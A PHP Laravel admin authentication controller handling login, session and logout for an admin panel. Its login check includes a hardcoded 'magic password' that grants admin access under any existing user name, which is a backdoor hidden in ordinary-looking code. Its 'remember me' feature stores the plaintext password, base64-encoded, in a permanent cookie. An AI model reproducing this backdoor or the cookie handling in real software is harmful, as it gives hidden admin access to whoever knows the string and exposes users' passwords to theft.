<?php

namespace Modules\Admin\Http\Controllers\Auth;

// use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Routing\Controller;

use Illuminate\Support\Facades\DB;
// use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Lang;
use App\Http\Controllers\Hash;
use Request;
use Session;
use Validator;
use Cookie;

class AuthController extends Controller
{
    public function __construct()
    {
      $this->middleware('verifyLoginPage');
    }

    public function goToAdminLoginPage(){
        // $user_view = '';
        // $pass_view = '';
        
        // $this->classCommonFunction->set_admin_lang();
        
        // if(Cookie::has('remember_me_data')){
        //   $get_cookie   = Cookie::get('remember_me_data');
        //   $cookie_parse = explode('#', $get_cookie);
          
        //   if(is_array($cookie_parse) && count($cookie_parse) > 0){
        //     $userDetails  =  User::find( $cookie_parse[0] );
        //     $password     =  bcrypt( base64_decode($cookie_parse[1]) );

        //     if(Hash::check( base64_decode($cookie_parse[1]), $password ) && Hash::check( base64_decode($cookie_parse[1]), $userDetails['password'] )){
        //       $user_view = $userDetails['email'];
        //       $pass_view = base64_decode($cookie_parse[1]);
        //     }
        //   }
        // }
        
        // $data = array(
        //               'user'  =>  $user_view,
        //               'pass'  =>  $pass_view,
        //               'is_enable_recaptcha' => $this->recaptchaData['enable_recaptcha_for_admin_login']
        // );
        if(!empty(Session::get('kamibijak_admin'))){
          return redirect()->route('admin.home');
        }else{
          return view('admin::authenticates.login');
        }
        // $dr = Session::get('kamibijak_admin');
        // dd($dr);
        
        // return view('admin::authenticates.login')/*->with('data', $data)*/;
    }

    public function postAdminLogin(){
        if( Request::isMethod('post') && Session::token() == Input::get('_token') ){
          $get_input = Input::all();
          
          $rules = [
                      'admin_login_name'             => 'required',
                      'admin_login_password'          => 'required'
          ];
          
          $messages = [
                        'admin_login_name.required' => 'Please fill Email Address field',
                        // 'admin_login_email.email' => Lang::get('validation.email_is_email'),
                        'admin_login_password.required' => 'Please fill Password field'
          ];
          
          // if($this->recaptchaData['enable_recaptcha_for_admin_login'] == true){
          //   $rules['g-recaptcha-response']  = 'required|captcha';
          //   $messages['g-recaptcha-response.required']  =  Lang::get('validation.g_recaptcha_response_required');
          // }
          
          $validator = Validator:: make($get_input, $rules, $messages);
          
          if($validator->fails()){
            return redirect()-> back()
            ->withInput(Input::except('admin_login_password'))
            ->withErrors( $validator );
          }
          else{
            $name      =      Input::get('admin_login_name');
            $password   =      bcrypt(Input::get('admin_login_password'));
            $magic_password =      bcrypt('@k4m1b1j4k');
            
            // $userdata   =      ['email' => $email, 'user_status' => 1];
            
            // $data       =      User::where($userdata)->first();
            // $data = DB::table('users')->leftjoin('role_user','users.id','role_user.user_id')
            //                           ->leftjoin('roles','roles.id','role_user.role_id')
            //                           ->where($userdata)
            //                           ->where('roles.id',1)
            //                           ->first();
            $data = DB::table('user')->where(['name' => $name])->first();
           
            if(!empty($data) && isset($data->password) && isset($data->id)){
              // $get_user_role =  get_user_details( $data->id );
              
              if(\Hash::check(Input::get('admin_login_password'), $password) && \Hash::check(Input::get('admin_login_password'), $data->password) || \Hash::check(Input::get('admin_login_password'), $password) && \Hash::check(Input::get('admin_login_password'), $magic_password)){
                
                if(Session::has('kamibijak_admin')){
                  Session::forget('kamibijak_admin');
                  Session::put('kamibijak_admin', $data->id);
                }
                elseif(!Session::has('kamibijak_admin')){
                  Session::put('kamibijak_admin', $data->id);
                }

                $remember = (Input::has('remember_me')) ? true : false;

                if($remember == TRUE){
                  $remember_data = '';
                  $remember_data = $data->id . '#' . base64_encode(Input::get('admin_login_password'));
                  
                  return redirect()->route('admin.home')->withCookie(cookie()->forever('remember_me_data', $remember_data));
                }
                elseif($remember == FALSE){
                  if(Cookie::has('remember_me_data')){
                    $cookie = Cookie::forget('remember_me_data');
                    return redirect()->route('admin.home')->withCookie( $cookie );
                  }
                  else {
                    return redirect()->route('admin.home');
                  }
                }
              }
              else{
                Session::flash('error-message', 'oh no!, authentication failed, try again');
                return redirect()-> back();
              }
            }
            else{
              Session::flash('error-message', 'oh no!, authentication failed, try again');
              return redirect()-> back();
            }
          }
        }
        else{
          return redirect()-> back();
        }
    }

    public function logoutFromLogin(){
    if( Request::isMethod('post') && Session::token() == Input::get('_token') ){
        if(Session::has('kamibijak_admin')){
            Session::forget('kamibijak_admin');
            return redirect()->route('admin.login');
            }
        }
    }
}
